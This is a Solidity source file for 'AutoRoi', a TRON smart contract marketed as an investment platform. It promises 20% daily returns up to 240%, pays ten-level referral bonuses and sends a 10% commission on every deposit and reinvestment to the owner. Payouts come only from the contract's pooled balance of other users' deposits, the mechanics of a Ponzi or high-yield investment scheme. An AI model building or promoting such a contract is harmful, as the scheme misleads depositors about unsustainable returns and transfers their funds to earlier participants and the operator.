//SourceUnit: AutoRoi (2).sol

/*
 *
 *   AUTOROI - Smart Investment Platform Based on TRX Blockchain Smart-Contract Technology. 
 *   S&S8712943 dev
 */

pragma solidity ^0.4.25;

contract DateTime {
        struct _DateTime {
                uint16 year;
                uint8 month;
                uint8 day;
                uint8 hour;
                uint8 minute;
                uint8 second;
                uint8 weekday;
        }

        uint constant DAY_IN_SECONDS = 86400;
        uint constant YEAR_IN_SECONDS = 31536000;
        uint constant LEAP_YEAR_IN_SECONDS = 31622400;
        uint constant HOUR_IN_SECONDS = 3600;
        uint constant MINUTE_IN_SECONDS = 60;
        uint16 constant ORIGIN_YEAR = 1970;
        
        function isLeapYear(uint16 year) internal pure returns (bool) {
                if (year % 4 != 0) {
                        return false;
                }
                if (year % 100 != 0) {
                        return true;
                }
                if (year % 400 != 0) {
                        return false;
                }
                return true;
        }

        function leapYearsBefore(uint year) internal pure returns (uint) {
                year -= 1;
                return year / 4 - year / 100 + year / 400;
        }

        function getDaysInMonth(uint8 month, uint16 year) internal pure returns (uint8) {
                if (month == 1 || month == 3 || month == 5 || month == 7 || month == 8 || month == 10 || month == 12) {
                        return 31;
                }
                else if (month == 4 || month == 6 || month == 9 || month == 11) {
                        return 30;
                }
                else if (isLeapYear(year)) {
                        return 29;
                }
                else {
                        return 28;
                }
        }

        function parseTimestamp(uint timestamp) internal pure returns (_DateTime dt) {
                uint secondsAccountedFor = 0;
                uint buf;
                uint8 i;

                // Year
                dt.year = getYear(timestamp);
                buf = leapYearsBefore(dt.year) - leapYearsBefore(ORIGIN_YEAR);

                secondsAccountedFor += LEAP_YEAR_IN_SECONDS * buf;
                secondsAccountedFor += YEAR_IN_SECONDS * (dt.year - ORIGIN_YEAR - buf);

                // Month
                uint secondsInMonth;
                for (i = 1; i <= 12; i++) {
                        secondsInMonth = DAY_IN_SECONDS * getDaysInMonth(i, dt.year);
                        if (secondsInMonth + secondsAccountedFor > timestamp) {
                                dt.month = i;
                                break;
                        }
                        secondsAccountedFor += secondsInMonth;
                }

                // Day
                for (i = 1; i <= getDaysInMonth(dt.month, dt.year); i++) {
                        if (DAY_IN_SECONDS + secondsAccountedFor > timestamp) {
                                dt.day = i;
                                break;
                        }
                        secondsAccountedFor += DAY_IN_SECONDS;
                }

                // Hour
                dt.hour = getHour(timestamp);

                // Minute
                dt.minute = getMinute(timestamp);

                // Second
                dt.second = getSecond(timestamp);

                // Day of week.
                dt.weekday = getWeekday(timestamp);
        }

        function getYear(uint timestamp) internal pure returns (uint16) {
                uint secondsAccountedFor = 0;
                uint16 year;
                uint numLeapYears;

                // Year
                year = uint16(ORIGIN_YEAR + timestamp / YEAR_IN_SECONDS);
                numLeapYears = leapYearsBefore(year) - leapYearsBefore(ORIGIN_YEAR);

                secondsAccountedFor += LEAP_YEAR_IN_SECONDS * numLeapYears;
                secondsAccountedFor += YEAR_IN_SECONDS * (year - ORIGIN_YEAR - numLeapYears);

                while (secondsAccountedFor > timestamp) {
                        if (isLeapYear(uint16(year - 1))) {
                                secondsAccountedFor -= LEAP_YEAR_IN_SECONDS;
                        }
                        else {
                                secondsAccountedFor -= YEAR_IN_SECONDS;
                        }
                        year -= 1;
                }
                return year;
        }

        function getMonth(uint timestamp) internal pure returns (uint8) {
                return parseTimestamp(timestamp).month;
        }

        function getDay(uint timestamp) internal pure returns (uint8) {
                return parseTimestamp(timestamp).day;
        }

        function getHour(uint timestamp) internal pure returns (uint8) {
                return uint8((timestamp / 60 / 60) % 24);
        }

        function getMinute(uint timestamp) internal pure returns (uint8) {
                return uint8((timestamp / 60) % 60);
        }

        function getSecond(uint timestamp) internal pure returns (uint8) {
                return uint8(timestamp % 60);
        }

        function getWeekday(uint timestamp) internal pure returns (uint8) {
                return uint8((timestamp / DAY_IN_SECONDS + 4) % 7);
        }

       

    

}

contract AutoRoi is DateTime {

    using SafeMath for uint256;

    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
    uint public totalWithdrawn;
    uint public totalReinvest;
    uint public activedeposits;
    uint public lastcontractupdatedate;
    uint public lastcontractupdated;
    uint public lastupdatedamount;
    uint public contractbalance;
    uint private minDepositSize = 100E6;
    uint public devCommission = 10;
    uint public commissionDivisor = 100;
    uint256[] public REFERRAL_PERCENTS = [1000, 500, 300,200,100,100,100,100,100,100];
    uint256 constant public PERCENTS_DIVIDER = 10000;
    uint256 public MAX_LIMIT=24;
    uint256 public TIME_STEP=1 days;
    uint256 public dailylimit=20000E6;
    uint256 public ROIPercentage=2000;
    
    address owner;
    struct Player {
        uint trxDeposit;
        uint unsettled;
        uint time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint referralEarnings;
        uint256 Withdrawntemp;
        uint256 lastwithdrawaltime;
        mapping(uint256=>uint256) referralIncome; 
        mapping(uint256=>uint256) referrals; 
        
    }

    mapping(address => Player) public players;
    
    event Newbie(address indexed user, address indexed _referrer, uint _time);  
    event NewDeposit(address indexed user, uint256 amount, uint _time);  
    event Withdrawn(address indexed user, uint256 amount, uint _time);  
    event ReinvestAll(address indexed user, uint256 amount, uint _time);  
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount, uint _time);
    event Reinvest(address indexed user, uint256 amount, uint _time); 

    constructor(address _marketingAddr) public DateTime() {
        owner = _marketingAddr;
        players[owner].time=block.timestamp;
        lastcontractupdatedate=0;
        contractbalance=0;
        lastcontractupdated=block.timestamp;
    }

    function referralIncomeDist(address userAddress,uint256 _amount,bool isNew) private {
        Player storage player = players[userAddress];
        if (player.affFrom != address(0)) {

            address upline = player.affFrom;
            for (uint8 i = 0; i <= 9; i++) {
                if (upline != address(0)) {
                    uint256 amount = _amount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                    players[upline].affRewards = players[upline].affRewards.add(amount);
                    if(isNew){
                    players[upline].referrals[i]=players[upline].referrals[i].add(1);
                    }
                    emit RefBonus(upline, msg.sender, i, amount,block.timestamp);
                    upline = players[upline].affFrom;
                } else break;
            }
        }
    }

    function () external payable {}

    function deposit(address _affAddr) public payable {
    
        collect(msg.sender);
        require(msg.value >= minDepositSize, "not minimum amount!");
        
        uint depositAmount = msg.value;
        Player storage player = players[msg.sender];

        if (player.time == 0) {
           player.time = block.timestamp; 
            totalPlayers++;
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
                 emit Newbie(msg.sender, _affAddr, block.timestamp);
              player.affFrom = _affAddr;
            }
            else{
                emit Newbie(msg.sender, owner, block.timestamp);
              player.affFrom = owner;
           }
           referralIncomeDist(msg.sender,msg.value,true);
        }
        else{
            referralIncomeDist(msg.sender,msg.value,false);
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        

        totalInvested = totalInvested.add(depositAmount);
        activedeposits = activedeposits.add(depositAmount);
        emit NewDeposit(msg.sender, depositAmount, block.timestamp); 
       
        uint feedEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        owner.transfer(feedEarn);   
    }

    function withdraw() public {
        collect(msg.sender);
        require(block.timestamp > players[msg.sender].lastwithdrawaltime,"Only once you can withdraw in a day");
        require(players[msg.sender].interestProfit > 0);
        require(lastupdatedamount < contractbalance, "30% contract balance limit");
        if(players[msg.sender].interestProfit > dailylimit){
            players[msg.sender].unsettled=players[msg.sender].interestProfit.sub(dailylimit);
            players[msg.sender].interestProfit=dailylimit;
        }
        if(lastupdatedamount.add(players[msg.sender].interestProfit)>contractbalance){
            players[msg.sender].unsettled=players[msg.sender].unsettled.add(lastupdatedamount.add(players[msg.sender].interestProfit).sub(contractbalance));
            players[msg.sender].interestProfit=contractbalance.sub(lastupdatedamount);
        }  
        
        uint256 _amount=players[msg.sender].interestProfit;
        transferPayout(msg.sender, _amount);
        players[msg.sender].lastwithdrawaltime=block.timestamp.add(TIME_STEP); 
    }

    function reinvest(uint256 amount) private {

      Player storage player = players[msg.sender];
      uint256 depositAmount = amount;
      player.trxDeposit = player.trxDeposit.add(depositAmount);

      totalReinvest = totalReinvest.add(depositAmount);
      activedeposits = activedeposits.add(depositAmount);
      emit Reinvest(msg.sender, depositAmount, block.timestamp);
      uint feedEarn = depositAmount.mul(devCommission).div(commissionDivisor);
      owner.transfer(feedEarn);

    }
    
    function reinvestAll() public {
        require(block.timestamp > players[msg.sender].lastwithdrawaltime,"Only once you can withdraw or reinvestAll in a day");
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0 ||  players[msg.sender].affRewards > 0, "Zero amount");

        uint256 _amount=players[msg.sender].interestProfit;
        transferPayoutReinvest(msg.sender, _amount);
        players[msg.sender].lastwithdrawaltime=block.timestamp.add(TIME_STEP);
    }

    function collect(address _addr) internal {
        Player storage player = players[_addr];
        
        uint secPassed = block.timestamp.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
          uint collectProfit=0;
      
          if (secPassed > 0) {
                collectProfit = (uint(player.trxDeposit).mul(ROIPercentage).div(PERCENTS_DIVIDER))
                    .mul(secPassed)
                    .div(TIME_STEP);
    
                if (uint(player.payoutSum).add(collectProfit) > uint(player.trxDeposit).mul(MAX_LIMIT).div(10)) {
                    collectProfit = (uint(player.trxDeposit).mul(MAX_LIMIT).div(10)).sub(uint(player.payoutSum));
                }
            }
           
            player.interestProfit = player.interestProfit.add(collectProfit).add(player.unsettled);
            player.unsettled=0;
            player.time = player.time.add(secPassed);
        }
        updateContractBalance();
    }
    
    function transferPayout(address _receiver, uint _amount) internal {

        uint contractBalance = address(this).balance;
        if (contractBalance > 0) {
            uint payout = _amount > contractBalance ? contractBalance : _amount;
            totalPayout = totalPayout.add(payout);
            activedeposits = activedeposits.add(payout.mul(3).div(4));

            Player storage player = players[_receiver];
            player.payoutSum = player.payoutSum.add(payout);
            player.interestProfit = 0;
            
            msg.sender.transfer(payout.mul(3).div(4));
            lastupdatedamount=lastupdatedamount.add(payout.mul(3).div(4));
            emit Withdrawn(msg.sender, payout, block.timestamp);
            totalWithdrawn=totalWithdrawn.add(payout);
            reinvest(payout.mul(1).div(4));
        }
        
    }
    
    function transferPayoutReinvest(address _receiver, uint _amount) internal {
        uint payout = _amount;

        Player storage player = players[_receiver];
        player.referralEarnings=player.referralEarnings.add(player.affRewards);
        player.interestProfit = 0;
            
        reinvest(payout.add(player.affRewards));
        player.affRewards=0;
        emit ReinvestAll(msg.sender, payout, block.timestamp);
    }
    
    function updateContractBalance() private {
        uint256 h=getHour(block.timestamp);
        uint256 d=getDay(block.timestamp);
        if(h>0 && ((block.timestamp>lastcontractupdated.add(TIME_STEP)) || (block.timestamp>lastcontractupdated && lastcontractupdatedate!=d))){
            lastcontractupdatedate=d;
            lastcontractupdated=block.timestamp;
            contractbalance=getBalance().mul(300).div(1000);
            lastupdatedamount=0;
        }
    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);

      uint secPassed = block.timestamp.sub(player.time);
      uint collectProfit=0;
      
      if (secPassed > 0) {
         
            collectProfit = (uint(player.trxDeposit).mul(ROIPercentage).div(PERCENTS_DIVIDER))
                .mul(secPassed)
                .div(TIME_STEP);

            if (uint(player.payoutSum).add(collectProfit) > uint(player.trxDeposit).mul(MAX_LIMIT).div(10)) {
                collectProfit = (uint(player.trxDeposit).mul(MAX_LIMIT).div(10)).sub(uint(player.payoutSum));
            }
        }
      
      return collectProfit.add(player.interestProfit).add(player.unsettled);
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    function getReferralIncome(address userAddress) public view returns(uint256[] referrals){
      Player storage player = players[userAddress];
        uint256[] memory _referrals = new uint256[](10);
         for(uint256 i = 0; i < 10; i++) {
             _referrals[i]=player.referrals[i];
         }
        return (_referrals);
    }

}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}